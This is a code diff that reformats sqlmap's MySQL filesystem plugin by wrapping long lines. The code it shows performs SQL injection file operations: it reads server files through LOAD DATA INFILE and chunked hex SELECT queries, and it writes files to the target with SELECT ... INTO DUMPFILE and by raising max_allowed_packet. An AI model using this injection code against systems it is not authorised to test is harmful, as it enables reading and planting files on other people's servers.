@@ -29,6 +29,7 @@ from lib.request.connect import Connect as Request
 from lib.techniques.union.use import unionUse
 from plugins.generic.filesystem import Filesystem as GenericFilesystem
 
+
 class Filesystem(GenericFilesystem):
     def nonStackedReadFile(self, rFile):
         if not kb.bruteMode:
@@ -57,9 +58,11 @@ class Filesystem(GenericFilesystem):
         debugMsg = "loading the content of hexadecimal encoded file "
         debugMsg += "'%s' into support table" % remoteFile
         logger.debug(debugMsg)
-        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))
+        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (
+        tmpFile, self.fileTblName, randomStr(10), self.tblField))
 
-        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False,
+                                 expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
 
         if not isNumPosStrValue(length):
             warnMsg = "unable to retrieve the content of the "
@@ -80,10 +83,13 @@ class Filesystem(GenericFilesystem):
                 result = []
 
                 for i in xrange(1, length, chunkSize):
-                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, chunkSize, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
+                    chunk = inject.getValue(
+                        "SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, chunkSize, self.fileTblName),
+                        unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                     result.append(chunk)
             else:
-                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
+                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False,
+                                         charsetType=CHARSET_TYPE.HEXADECIMAL)
 
         return result
 
@@ -135,7 +141,8 @@ class Filesystem(GenericFilesystem):
         logger.debug(debugMsg)
 
         query = getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=remoteFile, HEXSTRING=fcEncodedStr)
-        query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
+        query = agent.prefixQuery(
+            query)  # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
         payload = agent.payload(newValue=query)
         Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)
 
@@ -163,7 +170,8 @@ class Filesystem(GenericFilesystem):
 
         logger.debug("inserting the hexadecimal encoded file to the support table")
 
-        inject.goStacked("SET GLOBAL max_allowed_packet = %d" % (1024 * 1024))  # 1MB (Note: https://github.com/sqlmapproject/sqlmap/issues/3230)
+        inject.goStacked("SET GLOBAL max_allowed_packet = %d" % (
+                    1024 * 1024))  # 1MB (Note: https://github.com/sqlmapproject/sqlmap/issues/3230)
 
         for sqlQuery in sqlQueries:
             inject.goStacked(sqlQuery)
@@ -172,6 +180,7 @@ class Filesystem(GenericFilesystem):
         logger.debug(debugMsg)
 
         # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
-        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, remoteFile), silent=True)
+        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, remoteFile),
+                         silent=True)
 
         return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
